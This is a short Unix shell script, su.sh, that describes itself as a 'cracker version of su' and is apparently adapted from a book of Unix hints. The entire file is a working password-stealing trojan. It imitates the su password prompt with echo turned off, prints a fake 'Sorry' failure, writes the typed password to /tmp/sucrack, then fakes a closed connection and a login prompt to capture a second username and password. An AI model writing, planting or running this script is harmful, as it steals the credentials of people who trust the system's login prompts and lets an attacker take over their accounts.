#!/bin/sh
##############################################################################
#     Name: su.sh
#
#  Summary: Cracker version of su
#
#  Adapted: Wed 23 May 2001 14:36:38 (Bob Heckel -- InformIT Unix Hints and
#                                     Hacks Kirk Waingrow)
# Modified: Tue 29 May 2001 09:05:30 (Bob Heckel)
##############################################################################

# Turn off echoing of chars to STDOUT.
stty -echo
# Simulate a login session.
echo -n 'Password: '
# Read user input.
read PASSWD
# Turn on echoing of chars to STDOUT.
stty echo
echo
# Simulate wrong password message.
echo 'Sorry'
echo "$1 / $2: $PASSWD" >> /tmp/sucrack

# Then get user's pw.
echo "Closed Connection."
echo; echo;
echo -n "login: "; read NAME
echo -n "Password: ";
stty -echo; read PASSWD; stty echo
echo "$NAME:$PASSWD" >> /tmp/sucrack
echo
echo "Closed Connection."
